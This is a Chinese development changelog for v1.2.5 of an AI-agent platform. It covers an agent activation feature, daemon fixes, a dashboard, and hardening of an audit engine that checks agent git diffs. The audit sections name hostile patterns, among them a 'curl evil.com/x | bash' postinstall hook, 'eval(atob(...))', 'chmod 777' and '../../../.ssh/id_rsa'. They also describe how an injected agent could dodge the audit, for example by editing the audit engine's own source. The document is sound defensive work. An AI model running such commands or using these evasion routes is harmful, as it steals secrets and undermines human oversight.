# v1.2.5 开发日志 — 🔗 激活链 Phase 1 + 审计引擎加固 + 多设备前置

> ✅ **已实现（定稿）。** 主线功能 5 commits（c61322b / 7654f75 / 4749c72 / 8f36cbd / 49d2292），52 files +4642/-240；全周期（含阶段一 BugFix 批次 + 阶段三~五 FORGE 修复）约 60 commits（v1.2.4..HEAD）。
>
> 开发完成快照：npm test 1441/1441 通过（audit 571 / core 185 / orchestrator 336 / daemon 171 等 12 包）· acceptance-test 126 场景 · shellcheck 零 error · check-version.sh 66/66 · check-test-count.sh 13 处校验一致 · 版本号已 bump 至 1.2.5

> 状态：已实现 · 孔放勋 · 2026-08-02（定稿 2026-08-03）
> 前置依赖：v1.2.4（知识进化基础设施）
> 激活链设计文档：[docs/guides/fde-activation-chain.md](../../guides/fde-activation-chain.md)

## 实现纪要

| 交付 | 落点 | 说明 |
|------|------|------|
| 一 · 🔗 激活链 Phase 1 ACTIVATE | `engine/orchestrator/src/activate.ts` + CLI + MCP | 读 FDE 交付物 → 注册企业 SubAgent，填补交付断裂带 |
| 二 · 🛡️ 审计引擎加固 | `engine/audit/src/rules/` | A20-A23 四规则 + 层次重构 + 结构性地基加固 + 盲区补全 |
| 三 · 🔧 daemon 可靠性 | `engine/daemon/src/` | 推送重试上限 + plist 校验 + 健康自检 + outbox 生命周期 |
| 四 · 🖥️ HTML Dashboard | `dashboard.html` + `tools/serve-dashboard.mjs` | 与 bash Dashboard 并存的浏览器版（同口径数据） |
| 五 · 多设备前置（轻量） | `engine/core/src/agent-identity.ts` 等 | 身份码 + 跨设备审计聚合 + 协议中立声明 |
| 六 · 📐 文档结构优化 | README / WIKI / ROADMAP / GUIDE | 激活链提为叙事脊柱 + 读者意图导航 + GUIDE 预算 700 |
| 阶段一 · v1.2.4 BugFix 批次 | P0×14 / P1 / P2 | 先于新功能完成，按铁律记录置后 |
| 阶段三~五 · 🔨 release-gate 闸门建设 | `FORGE/src/release-gate-driver.mjs` 等 | 发版闸门从 0 到可用：预执行器 + 三层熔断 + 检查命令归一化（见 §十一） |

> 阶段一 = v1.2.4 发布后的 BugFix 批次（P0×14 · P1×38 · P2×42）
> 阶段三~五 = 本版本发布过程中 release-gate-loop 闸门自身的迭代修复——属于"测试工具建设"，与产品代码修复分列

## 背景

v1.2.5 三条线并行推进：
1. **🔗 激活链 Phase 1 ACTIVATE**：让 FDE 交付物从静态文件变成注册好的企业 SubAgent
2. **🛡️ 审计引擎加固**（新增主线）：14 项 P0 缺陷修复 + 审计规则层次重构 + 4 条新安全规则 + **结构性地基加固** + **检测盲区补全**
3. **多设备前置**（轻量）：Agent 身份码 + 跨设备审计聚合 + 协议中立声明（原 L2/L3 大项已拆至 v1.3.3/v1.3.4/v1.4.0/v2.x）

## 🔗 激活链 Phase 1：ACTIVATE

### 痛点

FDE 诊断完成后交付了一堆静态文件（workflow.yml + skills/ + entities/），但没人把它们"点燃"——企业 IT 拿到 .md 和 .yml 不知道怎么跑起来。这就是**大断裂带**。

### 交付

**核心**：新增 `activate.ts`，读 FDE 交付物 → 组装企业 SubAgent 定义 → 写入 `.sofagent/subagents/*.yml`。

关键发现：`registry.ts` 的 `listAgents()` 从 v1.0.8 起就支持从 `.sofagent/subagents/` 目录读 YML 注册自定义 Agent。"轨道从早期就铺好了，一直没人往上面放车厢"。Phase 1 就是造车厢。

| 文件 | 改动 | 说明 |
|------|------|------|
| `engine/orchestrator/src/activate.ts` | 新建 | **核心**：读交付物 → 注册企业 Agent |
| `engine/orchestrator/src/__tests__/activate.test.ts` | 新建 | 单测 |
| `engine/mcp/src/tools/activate-workflow.ts` | 新建 | MCP `activate_workflow` tool |
| `engine/orchestrator/src/cli.ts` | 修改 | 新增 `activate` 子命令 |
| `engine/mcp/src/mcp-server.ts` | 修改 | 注册 `activate_workflow` tool |

**CLI**：`sofagent-orchestrator activate [--dry-run] [--node-filter <ids>]`
**MCP**：`activate_workflow` tool（支持 dry_run / node_filter 参数）

> 详细开发 Prompt：内部文档（开发阶段 prompt）

### 设计决策

- **不碰 LangGraph**——本版本只注册 Agent，不构建编排图
- **复用 registry.ts 的 YML 格式**——不发明新格式
- workflow.yml 缺失字段降级处理：缺 `agent` → 默认 enterprise；缺 `actions` → 默认 `[read]`；缺 `hitl` → 按 type 推断

## 多设备协同前置（轻量，配合激活链）

> **版本瘦身说明（2026-08-01）**：原规划的多设备协同 L2/L3 七大项过重（团队协作协议 / 组织能力市场 / 权限体系 / 代理网关 / 归因引擎），已拆出：
> - **L2 团队协作协议 + L3 组织能力市场** → v1.3.3 + v1.3.4（依赖 v1.3.1 身份码）
> - **场景驱动权限体系 + 代理网关硬边界** → v1.4.0（并入沙箱主题）
> - **ATTRIBUTION 归因引擎** → v2.x 探索区（探索型，依赖多设备数据积累）
> - **P6 边契约形式化 + Anchor 配置** → 降级（权限流/证据流/失败流随 v1.3.0 wrapToolCall + v1.4.0 沙箱自然落地，当前控制流+数据流两类边已满足审计需求）
> - **P6b SubAgent Agent Mailbox** → v1.2.7 编排引擎增强（⚠️ v1.4.8 勘误：零生产消费已退场，见 v1.2.7 勘误注）（原计划与 Session Goals / HITL 中断处理协同更自然））
>
> v1.2.5 只保留与激活链强相关、且轻量的三项：

① **Agent 独立身份码 + KYA 轻量版**——企业 SubAgent 注册后要有独立身份（加密签名凭证绑定委托人/约束/责任），这是激活链企业 SubAgent 的基础，也是后续 L2 协作的前提
② **跨设备审计轨迹聚合**——多设备审计历史可追溯（配合身份码，轻量版）
③ **协议中立审计**——审计层只走 MCP 等开放协议 + git diff/JSONL/Markdown 开放格式，不绑定单一平台（原则性声明，成本极低）

---

## 🛡️ 审计引擎加固（新增主线）

> 来源：独立审查发现的问题清单（P0=14 / P1=38 / P2=42）
> 审查 Prompt / 开发 Prompt：内部文档（开发阶段 prompt）

### 一、现有规则优化（P0 缺陷修复）

从 P0 清单中提取与审计引擎直接相关的修复项：

| 编号 | 规则 | 问题 | 修复 |
|------|------|------|------|
| 1 | A2 不泄密钥 | base64/hex 编码绕过——攻击者用 `echo KEY \| base64` 绕过明文检测 | 增加 base64/hex 解码后再比对的正则 |
| 2 | A2 不泄密钥 | 二进制文件 + `.gitattributes` 盲区——`diff=hex` 的文件 diff 为空行 | 检测 `.gitattributes` 中 `diff=` 标记，走二进制检测路径 |
| 3 | A2 不泄密钥 | `sanitizeRuleResult` 假告警——diff 内容含 secret 子串就告警，即使是注释 | 增加 context 行（+/- 前 2 行）判别，非新增行不告警 |
| 4 | A3 不改越界 | 中文短 commit message 误报——`修复bug` 三个字被判"无意义" | 扩展中文语义模板库，支持动词+名词模式 |
| 5 | ToolGate | 正则与 A2 漂移——ToolGate 的 secret 正则和 A2 不一致 | 提取共享正则常量到 `shared/patterns.ts` |

### 二、审计规则层次重构（核心变更）

当前 `AUDIT_PRIORITY` 分层存在规则归属问题，v1.2.5 调整规则在各层的归属（**层名 critical/warning/crutch/extended 不变**，只调每层的规则数组）：

**核心原则**：fast-fail 只对 critical 层生效。critical 层命中即停，其余层全量执行。

| 层级（原名不变） | 语义 | 规则 | fast-fail | 变动说明 |
|------|------|------|:---------:|----------|
| **critical** | 不可接受的安全威胁 | A1 不碰敏感 · A2 不泄密钥 · A9 不纳注入 · A10 不引毒源 · **A20 不泄外联(新)** · **A21 不植后门(新)** · **A22 不越权限(新)** · **A23 不逃路径(新)** | ✅ | A10 从 warning 提升；A20-A23 新增；A19 移出 |
| **warning** | 恶意/违规的业务行为 | A3 越界 · A4 删配置 · A5 瞒真相 · A11 滥资源(含原 E3 删除行数) · A19 msg质量 | ❌ | A19 从 critical 移此 |
| **crutch** | Agent 能力不足的防护 | A6 构建 · A7 盲改 · A8 逃验证 · A18 垃圾文件 | ❌ | A6 从 warning 移此 |
| **extended** | opt-in 质量规则 | A14 越权 · A15 盲动 · A16 非授权 · A17 批量 · E1 · E2 · E4 | ❌ | E3 已并入 A11（规则数 -1）|

**关键修正**：
- ❌ **A19 从 critical 移到 warning**——commit 消息写得烂不代表代码有密钥泄露，不该跳过 A2/A9 检查
- ✅ **A10 从 warning 提升到 critical**——引入恶意 npm 包/恶意仓库是安全红线，必须优先拦截
- ✅ **A6 从 warning 移到 crutch**——构建坏了是 Agent 能力不足，不是恶意行为
- ✅ **层名不变**——critical/warning/crutch/extended 是审计输出/Webhook/acceptance-test 的已有引用，改层名是 breaking change

**涉及文件**：
| 文件 | 改动 |
|------|------|
| `engine/audit/src/rules/runner.ts` | `AUDIT_PRIORITY` 规则归属调整（层名不变） |
| `engine/audit/src/rules/index.ts` | 新增 A20/A21/A22/A23 注册 + E3 删除（并入 A11）+ A10 ruleClass 改 `业务底线`、A6 改 `能力拐杖`、A19 改 `工程规范` |
| `engine/audit/src/rules/rule-a20-network-exfiltration.ts` | 新建 |
| `engine/audit/src/rules/rule-a21-persistence.ts` | 新建 |
| `engine/audit/src/rules/rule-a22-privilege-escalation.ts` | 新建 |
| `engine/audit/src/rules/rule-a23-path-traversal.ts` | 新建 |
| `engine/audit/src/rules/rule-a11-no-abuse.ts` | 修改：吸收 E3 删除行数维度 |
| `engine/audit/src/rules/rule-a10-no-poison.ts` | 修改：增强 typosquatting 检测 + postinstall/preinstall 脚本注入检测 |
| `engine/audit/src/rules/rule-e3-large-deletion.ts` | 删除（语义并入 A11）|
| `engine/audit/src/rules/rule-a16-unauthorized-change.ts` | 修改：新增 `AUDIT_ENGINE_PROTECTED_PATHS`（审计引擎核心源码自保护，见 §6.3） |

### 三、新增安全规则（填补四大盲区）

| 规则 | 检测目标 | evidenceMode | ruleClass | 层级 |
|------|---------|:------------:|-----------|:----:|
| **A20 不泄外联** | git diff 中出现往外部 URL 发送数据的代码（`curl`/`wget`/`fetch` 指向非白名单域名，或把密钥/凭证 POST 到外部） | git-diff | 业务底线 | 第 0 层 |
| **A21 不植后门** | git diff 中出现创建 LaunchAgent/cron job/systemd service/注册表自启项的代码 | git-diff | 业务底线 | 第 0 层 |
| **A22 不越权限** | git diff 中出现 `chmod 777`/修改 sudoers/setuid/setgid/chown root 等 | git-diff | 业务底线 | 第 0 层 |
| **A23 不逃路径** | git diff 中出现路径穿越（`../../../`）和 symlink 逃逸——A1 只匹配 basename，`../../id_rsa.bak` 可绕过 | git-diff | 业务底线 | 第 0 层 |

**设计依据**：现有 21 条规则全部聚焦"Agent 改了什么文件"，但对"Agent 做了什么动作"和"路径变形"的检测完全空白。一个被注入的 Agent 可以：(1) 偷偷把 `.env` POST 到外部 (2) 偷建 LaunchAgent 永久驻留 (3) `chmod 777` 整个目录 (4) 用 `../../../.ssh/id_rsa` 绕过 A1 basename 匹配。这四类是 Agent 安全的最高危场景，当前零检测。

### 四、规则精简（E3 并入 A11）

E3「不滥删除」检测单文件删除>100 行——与 A11「不滥资源」的删除文件数>20 是同一语义的两种维度（行数 vs 文件数）。合并后 A11 同时管两个维度，E3 删除，规则总数从 25 降回 24。

### 五、现有规则增强（A10 依赖混淆 + postinstall 脚本注入检测）

A10「不引毒源」当前只检测依赖来源 URL 是否可疑（`raw.githubusercontent` / `git+http`）。增强后增加两个维度：

1. **typosquatting 检测**——包名与知名包的 Levenshtein 距离<=2 时告警（如 `lodsh` vs `lodash`）。不新增编号，扩展现有规则
2. **postinstall 脚本注入检测**——npm 供应链攻击最经典的不是 typosquatting，而是在 `package.json` scripts 中加 `postinstall`/`preinstall` 钩子执行恶意命令（如 `"postinstall": "curl evil.com/x | bash"`）。A10 检查包来源，A20 检查外传数据，但 postinstall 是"下载执行"不是"上传数据"——两头不沾，是 A10/A20 之间的真实缝隙。增强后 A10 检测 scripts hook 中的 `curl|bash`/`eval`/`child_process` 等危险执行命令

---

## 六、结构性地基加固（CRITICAL — 不修则 A20-A23 白加）

> 来源：v1.2.5 审计层最终深度审查。三个结构性地基问题如果不修，新增 A20-A23 等于给安全门上了把可以随便拆的锁。

### 6.1 BASELINE_RULE_KEYS 扩展（P0）

**问题**：`@sofagent/core` 的 `BASELINE_RULE_KEYS` 只有 5 条（`a1/a2/a9/a10/a11`）。runner.ts 的保护逻辑：即使 config.yml 写了 `a1: false`，A1 仍然生效。但 A20-A23 作为 critical 层安全红线，**不在基线保护列表**——企业 IT 在 config.yml 写 `a20: false`，网络外联检测就静默关闭了。

**修复**：`BASELINE_RULE_KEYS` 从 5 条扩展到 9 条，加入 `a20/a21/a22/a23`。安全红线不可 config 关闭。

| 文件 | 改动 |
|------|------|
| `engine/core/src/config.ts`（或 BASELINE 定义处） | `BASELINE_RULE_KEYS` 增加 a20-a23 |

### 6.2 critical 层全量收集（P0）

**问题**：runner.ts 的 fast-fail 逻辑——critical 层第一个 FAIL 就立即 return，后续 critical 规则全部 SKIPPED。实际场景：Agent 同时碰 `.env`（A1）+ curl 外传（A20）+ 建 LaunchAgent 后门（A21）——当前只报 A1，另外两个安全红线被跳过。审计报告 1 个问题，实际 3 个违规。

**修复**：critical 层 8 条规则全部跑完，收集所有 FAIL，然后统一 fast-fail（跳过后续层）。性能成本 <1ms（8 条正则），安全可见性大幅提升。后续层（warning/crutch/extended）的 fast-fail 保护不变。

| 文件 | 改动 |
|------|------|
| `engine/audit/src/rules/runner.ts` | critical 层循环改为全量收集 + 统一 fast-fail |

### 6.3 审计引擎源码自保护（P1）

**问题**：当前没有规则检测"Agent 修改了审计引擎源码"。Agent 被注入后可直接编辑 `runner.ts` 删掉自己的 critical 归属——**审计引擎审计不了自己的修改**。

**修复**：在 A16（非授权文件变更，extended 层）受保护路径列表中加入审计引擎核心源码路径（`engine/audit/src/rules/` 下所有 `.ts` 文件 + `shared/patterns.ts`）。

| 文件 | 改动 |
|------|------|
| `engine/audit/src/rules/rule-a16-unauthorized-change.ts` | 新增 `AUDIT_ENGINE_PROTECTED_PATHS` 路径列表 |

> **设计决策**：放在 A16（extended 层）而非提升到 critical。① v1.2.5 不宜再加新 critical 规则 ② A16 的路径保护能力现成 ③ 只需扩展路径列表，不改检测逻辑。但 A16 是 opt-in，企业需开启 `extendedRulesEnabled: true` 才生效——后续版本可考虑提升为 default rule。

---

## 七、检测盲区补全

### 7.1 A9 扩展：动态执行模式告警（P2）

**背景**：Agent 可写 `eval(atob('...'))` / `new Function(...)()` / `require('child_process').exec(...)` 绕过静态审计。A2 能解码 base64 检查密钥但不检查代码执行。A9 检测 prompt injection 但不检测代码层 obfuscation。

**修复**：A9 的 `MEDIUM_CONFIDENCE_PATTERNS` 新增动态执行模式（eval / new Function / child_process / exec+危险命令），命中时 WARN。

> **定位**：此项是"补一层告警"，不是完整防护。真正的动态执行拦截留 v1.3.0 运行时审计（wrapToolCall middleware 在执行时刻拦截）。v1.2.5 只做静态告警。

| 文件 | 改动 |
|------|------|
| `engine/audit/src/rules/rule-a9-no-injection.ts` | `MEDIUM_CONFIDENCE_PATTERNS` 新增 4 条动态执行模式 |

### 7.2 shared/patterns.ts 扩展为全规则共享库（P2）

**背景**：§一.5 已把 ToolGate 和 A2 的 secret 正则统一到 `shared/patterns.ts`。但 A9 的脱敏正则和 A2 的检测正则也是独立实现。长期来看，所有跨规则的共享正则都应收敛到一个文件——否则改一处忘另一处，又产生漂移。

**修复**：`shared/patterns.ts` 扩展，纳入 `REDACTION_PATTERNS`（从 A9 迁移）+ `DOMAIN_WHITELIST`（A20）+ `DANGEROUS_SCRIPT_CMDS`（A10 postinstall）。

> **定位**：收敛重构，降低未来维护成本。不新增检测能力，不改变现有行为。

| 文件 | 改动 |
|------|------|
| `engine/audit/src/rules/shared/patterns.ts` | 扩展为全规则共享库（secret + redaction + domain + script） |

---

## 八、文档结构优化（2026-08-02）

> 来源：v1.2.4 发版后文档全局审视。核心问题：激活链作为产品旅程被压在脚注里；WIKI 导航按文件而非按读者意图组织；FORGE 工程细节在主线上文档中占比过重。

### 8.1 README：激活链从脚注提升为正式小节

「能帮你做什么」末尾的 blockquote 脚注（"给企业的完整闭环 v1.2.5+ 规划中"）→ 提升为正式 `### 从交付到自转（激活链）` 小节，含四阶段表格（ACTIVATE→ORCHESTRATE→EXECUTE→SUSTAIN）+ 对应版本号。GitHub README 风格，不用 storyboard。

### 8.2 WIKI：按读者意图重组导航

- §二核心概念表：新增「激活链」条目
- §七导航段：从"遇到 X 问题→读 Y 文档"平铺表 → 三组读者意图分区：
  - **了解 FDE Agent**（产品→理念→路线→激活链→部署→证据）
  - **部署 / 集成 / 开发**（架构→开发→版本→规则→Skill→测试）
  - **贡献 / 审查 / 发版（内部工程）**（FORGE→releasing→fresh-eyes→CONTRIBUTING）

### 8.3 ROADMAP：版本规划加激活链进度框架

版本规划表前新增一行框架声明："v1.2.5-v1.3.0 按激活链四阶段推进"，让读者在看具体版本表之前先建立阶段感。

### 8.4 铁律落盘（MEMORY.md）

新增铁律 #9：FORGE/fresh-eyes/releasing 细节不入主线文档（README / WIKI 前段 / ROADMAP prose / PHILOSOPHY），只在 FORGE/ 目录、WIKI 贡献者导航组、changelog/releasing.md、折叠区出现。防止未来 session 把工程内部工具展开到用户面。

### 8.5 GUIDE.md 行数预算上调 300-500 → 700（P0-12 收尾）

v1.2.4 P4 规划曾定 FDE/GUIDE.md「300-500 行教科书文体」。v1.2.5 P0-12 复核发现验收表数字与实测不符，实测 GUIDE.md **650 行**（已在 v1.2.4.md:354 如实回填）。

经评估，650 行是"每章配真实案例 + 激活链诊断方法论完整展开"的自然体量，强行压回 500 行会牺牲案例完整度（FDE 定位本就是"半天精读、读完能独立做诊断"）。**决定：预算上调至 700 行，不拆分、不删内容。**

- **约束落点说明**：GUIDE.md 的行数预算**无脚本强制**——`tools/check-docs.sh` 明确把 `FDE/` 排除在所有预算层之外（FDE 是独立产品目录，行数由 FDE 侧单独管理），`check-version.sh` 也不检查 GUIDE 行数。"300-500" 仅是 v1.2.4 的规划目标文字，非门禁。因此本次"上调"以 changelog 记录为准，无需改动任何脚本。
- **新预算**：GUIDE.md ≤ 700 行（留 50 行弹性）；超过则考虑按章拆分子手册或评估内容精简。

---

## 九、🔧 daemon 可靠性专题（新增主线）

> 来源：P0-1（--init plist 假成功）+ P0-2（im-outbox 爆炸）+ 14:30 bugfix 修复实践。
> 定位：daemon 是"7×24 常驻"承诺的载体。如果它自己不稳定，激活链跑起来也是空话。

### 已修复（14:30 bugfix 批次）

| 编号 | 问题 | 修复 |
|------|------|------|
| P0-1 | `--init` 无条件覆写全局 `~/Library/LaunchAgents/com.sofagent.daemon.plist`；npx 场景生成指向不存在路径的坏 plist 仍打印"✅ 成功" | --init 交互化（已存在时询问覆盖，非 TTY 默认 N）+ plist 路径加 `engine/daemon/` 前缀校验 + 写入后 `launchctl load` 验证 |
| P0-2 | `~/.sofagent/data/im-outbox/` 累积 10540 个重复"知识沉淀周报"（41MB，~1700/天），疑似 pushKnowledgeSummary 循环/重试缺陷 | 去重（同标题 24h 内不重发）+ 7 天自动清理 + 目录上限 100 文件 |

### 结构性加固（本版本新增）

| 项 | 问题 | 方案 |
|------|------|------|
| **写入去重 + 重试上限** | pushKnowledgeSummary 等推送函数无重试上限，失败后无限循环写入 | 所有推送函数加 `maxRetries=3` + 指数退避（1s/4s/16s）；超限写 `daemon-errors.jsonl` 不再重试 |
| **plist 路径校验** | `--init` 生成 plist 时不验证 ProgramArguments 路径是否存在 | 写入前 `fs.existsSync(programPath)` 校验；不存在则 WARN 不写 plist（不打印假成功） |
| **健康自检** | daemon 启动后无自检机制，crash loop 无人知晓 | 启动时写 `daemon-health.json`（pid + startTime + version + status:"running"）；watchdog 每 5min 更新 lastHeartbeat；Dashboard 消费此文件判断 daemon 是否活着 |
| **im-outbox 生命周期** | 推送成功后文件残留，无清理机制 | 推送成功 → 立即删除源文件；推送失败 → 移入 `im-outbox/failed/`（不阻塞主循环）；7 天 cron 清理 failed/ |

### 涉及文件

| 文件 | 改动 |
|------|------|
| `engine/daemon/src/push.ts`（或等效推送模块） | maxRetries + 指数退避 + 去重逻辑 |
| `engine/daemon/src/init.ts` | plist 路径校验（existsSync）+ 写入后 launchctl 验证 |
| `engine/daemon/src/health.ts`（新建） | 健康自检：写 daemon-health.json + heartbeat 更新 |
| `engine/daemon/src/im-outbox.ts`（或等效） | 成功删除 / 失败移入 failed/ / 7 天清理 |
| `engine/daemon/src/__tests__/daemon-reliability.test.ts`（新建） | 覆盖：重试上限 / plist 校验 / 去重 / 健康文件写入 |

## 十、🖥️ HTML Dashboard 全新实现（v1.2.5 补充）

> 与 bash Dashboard（`tools/sofagent-dashboard.sh`）并存：bash 面向终端（--watch/--trend/--full），HTML 面向浏览器（导航化多页 + 实时数据）。两者数据口径一致。

### 交付

| 文件 | 说明 |
|------|------|
| `dashboard.html`（仓库根目录） | 单文件零依赖 SPA，6 页导航：驾驶舱 / FDE引导 / AI节点 / 本体结构 / 知识库 / 工具箱（含引擎内容） |
| `tools/serve-dashboard.mjs` | 本地 HTTP 服务器：页面 + `/data/*` 原始数据 + `/api/summary` 聚合口径 |

### 数据链路（关键设计）

- **`/api/summary` 复用 bash dashboard 的 jq 聚合口径**——PASS/WARN/FAIL 统计、本周 TOP3 违规、数据主权聚合，全部与 `tools/sofagent-dashboard.sh` 的 `render_rules` / `render_sovereignty` 同一逻辑（`dataFlow.destination=="cloud-api"` / `direction=="outbound"` 判定），HTML 与终端看到的是同一份数据
- `/data/*` 映射 `~/.sofagent/data/*`；`history.jsonl` 截断最近 500 条（12MB → 1.3MB）防浏览器卡死
- **File System Access API**：Chrome/Edge 用户可直接点"连接数据目录"选 `~/.sofagent/data`，免服务器（Safari 不支持自动隐藏按钮）
- 静态打开 HTML（无服务器）自动降级为示例数据 + 提示

### 页面内容（真实数据驱动）

| 页面 | 数据源 |
|------|--------|
| 驾驶舱 | `/api/summary`（bash 口径）+ `daemon-health.json` |
| AI 节点 | `/api/ai-nodes`（workflow 模板 + subagents 注册）+ `dashboard/graph-state.json`（编排控制图） |
| 本体结构 | `/api/ontology`（knowledge/ 目录结构） |
| 知识库 | `knowledge/index.md` + `log.md` + `think.md` |
| 工具箱 | `/api/release-gate`（发版门禁）+ FORGE latest.json + MCP/npm/文档静态展示 |

### 其他

- 右上角 GitHub logo + Stars 计数（GitHub API）
- header 三段 grid 导航居中（`1fr auto 1fr`）
- 所有图表内联 SVG 手写，零外部依赖，离线可用
- 服务器特性：端口自动检测（占用 +1）、自动打开浏览器、no-cache 头

---

## 十一、🔨 release-gate 发版闸门建设（阶段三~五 · FORGE 工程线）

> 本版本发布过程本身就是 release-gate-loop 的首次实战——闸门从零到可用经历 run-01~run-08 多轮迭代。此节记录的是**测试基础设施自身**的修复，与产品代码修复分列。

### 11.1 方案 A 预执行器（性能 · f4db7e1 + 0bb592a）

regression 49 维度的检查命令执行从 LLM worker 剥离——driver 直跑全部维度命令写入 `regression-precheck.json`，worker 只读 JSON 做判定。**工具调用从 1665 次降至 ~5 次**，GraphRecursionError 崩溃模式根治。后续补丁：changelog 路径嵌套 bug + acceptance 场景索引剥离 LLM。

### 11.2 三层熔断移植（稳定性）

从 fresh-eyes-driver 移植三层熔断到 release-gate-driver：**L1 软熔断**（stateModifier 注入"立即写报告"指令，工具调用 ≥30）→ **L2 硬熔断**（≥40 进入 grace window 写报告抢救：分析型步骤 10 步 / 默认 5 步，isReportText 质量门控）→ **L3 框架兜底**（LangGraph recursionLimit）。另含维度级超时覆盖（DIM_TIMEOUT_OVERRIDE，重遍历维度 120s）。

### 11.3 检查命令误报修复（零信任复核 · 阶段五循环）

run-06~run-08 多轮验证确立方法论：**worker 的 FAIL 判定不可全信，必须亲手实跑检查命令**。四个误报全部是检查命令自身缺陷：

| 维度 | 误报现象 | 根因与修复 |
|:--:|------|------|
| #4 | 规则注册数 FAIL | 期望值过期（21→24）+ 子项 d 用两种格式直接 diff 永远有差异 → 重写为归一化比对（`A编号 ruleClass`） |
| #7 | config.yml 缺失 FAIL | `.sofagent/config.yml` 是 .gitignore 运行时文件，干净环境必然不存在 → 加前置判断，不存在标 ⏸️ 需初始化 |
| #49 | install.sh"旧路径残留" | `~/.sofagent/skill/` 是正确的 HOME 部署路径，子串 `sofagent/skill/` 误匹配 + docs/archive、docs/changelog 历史文档未豁免 → 收紧匹配 + 目录豁免 |
| #51 | unverifiable 三态 FAIL | grep 找 doctor.ts 字面串，但该状态在 else 分支兜底 → 改查 audit-history.ts 定义侧 |
| **A21 自审误报** | v1.2.5 发版 commit 被自家 A21 拦截 | daemon 巡检器注释里的 `@daily` 调度标记被 `/@(reboot\|daily\|hourly)\s/` 误判为 crontab 后门 → A21 增加纯注释行豁免（`^\s*(//\|\*\|#)`），+3 回归测试锁定（测试数 SSOT 1438→1441） |

### 11.4 流程文档落档

- `docs/changelog/releasing.md` 阶段五简化：从「开发 session 预跑 + 新 session 监控」双 session → 单 session 一步到位（1 段 prompt 完成 acceptance → 预建目录 → driver → 轮询 → 汇报）
- `FORGE/playbook/regression-checklist.md` 随每轮误报修复同步更新（49 维度 · ≤1050 行预算）
- sandbox 杀后台进程教训：driver 必须在新 session 跑（开发 session 后台启动必被杀）

### 11.5 阶段九确认关口：load-chain 漏包发现

阶段九核对 npm 远端版本时发现 `@sofagent/load-chain`（engine/hooks/sofagent-load-chain，本地已 1.2.5）远端停在 **1.2.1**——落后两个版本，而 releasing.md 的 Step 2 publish 清单和 Step 3 验证清单都没列它（engine/hooks/ 子目录非一级目录，最易被遗漏）。这是 v1.2.3「漏 rules 虚假绿色」教训的重演风险。已修 releasing.md：publish 清单补 load-chain（第一层 4.5）+ rules（第二层 7.5）、验证循环补 load-chain（13 包全列）、教训索引追加本条。本次发布必须确保 13 包全部到 1.2.5。

---

## 发布检查清单（汇总）

### 🔗 激活链 Phase 1
- [x] activate.ts 单测通过（activate.test.ts）
- [x] CLI `activate` 子命令 + MCP `activate_workflow` tool 注册
- [x] 降级处理（缺 agent/actions/hitl 字段）有测试覆盖

### 🛡️ 审计引擎加固
- [x] A20-A23 四规则注册，注册总数 24（17 默认 + 7 扩展）
- [x] BASELINE_RULE_KEYS 扩展至 9 条（a20-a23 不可 config 关闭）
- [x] critical 层全量收集 + 统一 fast-fail
- [x] A16 审计引擎源码自保护路径
- [x] E3 并入 A11，规则数净减 1
- [x] shared/patterns.ts 全规则共享库（secret + redaction + domain + script）

### 🔧 daemon 可靠性
- [x] 推送函数 maxRetries=3 + 指数退避 + 去重
- [x] plist 路径 existsSync 校验（无假成功）
- [x] daemon-health.json + heartbeat + im-outbox 生命周期

### 🖥️ HTML Dashboard
- [x] `/api/summary` 与 bash dashboard jq 口径一致
- [x] 静态打开降级为示例数据

### 多设备前置 + 文档
- [x] agent-identity 身份码 + 跨设备审计聚合测试通过
- [x] 全局规则数 21→24、测试数 1320→1438 文档同步（1311049）

### 🔨 release-gate 闸门（FORGE）
- [x] 预执行器：regression 命令执行剥离 LLM（regression-precheck.json）
- [x] 三层熔断移植（L1 软 / L2 硬 grace window / L3 recursionLimit）
- [x] 检查命令误报修复 × 4（#4/#7/#49/#51）
- [x] releasing.md 阶段五单 session 简化

### 通用
- [x] npm test 1441/1441 全绿
- [x] acceptance-test.sh 126 场景（阶段五 release-gate-loop 执行）
- [x] shellcheck 零 error（engine/scripts + tools + install.sh）
- [x] check-version.sh 66/66（bump dashboard 校验纳入后，全绿）
- [x] check-test-count.sh 13 处校验一致（workspace 1441 / audit 571）
- [x] 版本号 bump 1.2.4 → 1.2.5（bump-version.sh + package-lock 同步）
- [x] 根 CHANGELOG.md 索引条目就位（正式版章节顶部）
- [x] ROADMAP 五步更新（迭代历程 + 里程碑表 + 文件头）
- [x] 阶段一 BugFix 批次全部落档（v1.2.4 BugFix，P0×14 先行修复）
